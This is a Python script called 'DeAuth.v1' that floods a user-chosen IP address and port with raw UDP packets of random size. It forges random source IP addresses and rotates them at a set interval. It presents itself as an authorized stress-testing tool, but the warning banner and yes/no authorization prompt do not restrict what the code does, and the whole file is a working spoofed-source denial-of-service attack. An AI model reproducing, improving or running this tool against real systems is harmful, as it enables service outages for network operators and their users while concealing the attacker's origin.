import socket
import random
import struct
import time
import colorama
from colorama import Fore, Style

# Initialize Colorama
colorama.init(autoreset=True)

# Clear terminal and display header
print("\n" * 100)
print(Fore.MAGENTA + Style.BRIGHT)
print("""
▓█████▄ ▓█████ ▄▄▄       █    ██ ▄▄▄█████▓ ██░ ██ 
▒██▀ ██▌▓█   ▀▒████▄     ██  ▓██▒▓  ██▒ ▓▒▓██░ ██▒
░██   █▌▒███  ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██▀▀██░
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ░▓█ ░██ 
░▒████▓ ░▒████▒▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░▓█▒░██▓
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░    ▒ ░░▒░▒
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░░░▒░ ░ ░     ░     ▒ ░▒░ ░
 ░ ░  ░    ░    ░   ▒    ░░░ ░ ░   ░       ░  ░░ ░
   ░       ░  ░     ░  ░   ░               ░  ░  ░
 ░                                DeAuth.v1                                        
""")
print(Fore.BLUE + "This tool is for authorized stress testing of public or private systems only.")
print(Fore.RED + "Unauthorized use is illegal and unethical. Proceed only with explicit permission.")
print("")

# Logging function
def log_test(ip, port, duration, min_packet_size, max_packet_size, spoof_interval):
    with open("test_log.txt", "a") as log_file:
        log_file.write(
            f"Target: {ip}, Port: {port}, Duration: {duration}s, "
            f"Packet Size Range: {min_packet_size}-{max_packet_size} bytes, "
            f"IP Spoof Interval: {spoof_interval}s, Time: {time.ctime()}\n"
        )
    print(Fore.GREEN + "[*] Test details logged.")

# Function to generate random IP
def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# Function to calculate checksum (used for IP headers)
def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i + 1] if i + 1 < len(data) else 0)
        s = (s + w) & 0xFFFF
    return ~s & 0xFFFF

# Get user input
ip = input(Fore.BLUE + "Enter the target IP (public or private): " + Fore.MAGENTA)
port = int(input(Fore.BLUE + "Enter the target port: " + Fore.MAGENTA))

# Define packet size range
min_packet_size = int(input(Fore.BLUE + "Enter the minimum packet size (bytes, minimum 1): " + Fore.MAGENTA))
max_packet_size = int(input(Fore.BLUE + "Enter the maximum packet size (bytes, max 65500): " + Fore.MAGENTA))
if max_packet_size > 65500 or min_packet_size < 1 or min_packet_size > max_packet_size:
    print(Fore.RED + "[!] Error: Invalid packet size range. Minimum must be >= 1, and maximum <= 65500.")
    exit()

duration = int(input(Fore.BLUE + "Enter the duration for the test (seconds): " + Fore.MAGENTA))
spoof_interval = int(input(Fore.BLUE + "Enter the IP spoofing interval (seconds): " + Fore.MAGENTA))
print("")

# Display summary and get user confirmation
print(Fore.YELLOW + "Test Summary:")
print(Fore.CYAN + f"Target IP: {ip}")
print(Fore.CYAN + f"Target Port: {port}")
print(Fore.CYAN + f"Packet Size Range: {min_packet_size}-{max_packet_size} bytes")
print(Fore.CYAN + f"Duration: {duration} seconds")
print(Fore.CYAN + f"IP Spoof Interval: {spoof_interval} seconds")
confirm = input(Fore.RED + "Do you confirm that you have written authorization to test this target? (yes/no): " + Fore.MAGENTA)
if confirm.lower() != "yes":
    print(Fore.RED + "[!] Test aborted by user.")
    exit()

# Logging the test details
log_test(ip, port, duration, min_packet_size, max_packet_size, spoof_interval)

# Perform the stress test with periodic IP spoofing
timeout = time.time() + duration
next_spoof_time = time.time()
sent = 0
current_spoofed_ip = random_ip()  # Initialize first spoofed IP

print(Fore.GREEN + "[*] Starting stress test with periodic IP spoofing...")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while time.time() < timeout:
        # Change spoofed IP if the interval has passed
        if time.time() >= next_spoof_time:
            current_spoofed_ip = random_ip()
            next_spoof_time = time.time() + spoof_interval
            print(Fore.YELLOW + f"\n[!] Changing spoofed IP to {current_spoofed_ip}")

        # Generate random packet size within the range
        packet_size = random.randint(min_packet_size, max_packet_size)
        data = random._urandom(packet_size)

        # Build IP header
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            69,  # Version and IHL
            0,  # Type of Service
            20 + len(data),  # Total Length
            random.randint(0, 65535),  # Identification
            0,  # Flags and Fragment Offset
            64,  # TTL
            socket.IPPROTO_UDP,  # Protocol
            0,  # Header Checksum (will calculate later)
            socket.inet_aton(current_spoofed_ip),  # Source Address
            socket.inet_aton(ip),  # Destination Address
        )
        ip_checksum = checksum(ip_header)
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            69, 0, 20 + len(data), random.randint(0, 65535), 0, 64, socket.IPPROTO_UDP,
            ip_checksum,
            socket.inet_aton(current_spoofed_ip), socket.inet_aton(ip)
        )

        # Build UDP header
        udp_header = struct.pack(
            "!HHHH",
            random.randint(1024, 65535),  # Source Port
            port,  # Destination Port
            8 + len(data),  # Length
            0  # Checksum
        )

        # Send the packet
        sock.sendto(ip_header + udp_header + data, (ip, port))
        sent += 1
        print(Fore.MAGENTA + f"[+] Sent {sent} packets from {current_spoofed_ip} to {ip} on port {port} (size: {packet_size} bytes)", end="\r")

    print(Fore.GREEN + f"\n[*] Test completed. Sent {sent} packets.")
except Exception as e:
    print(Fore.RED + f"[!] An error occurred: {e}")
finally:
    sock.close()
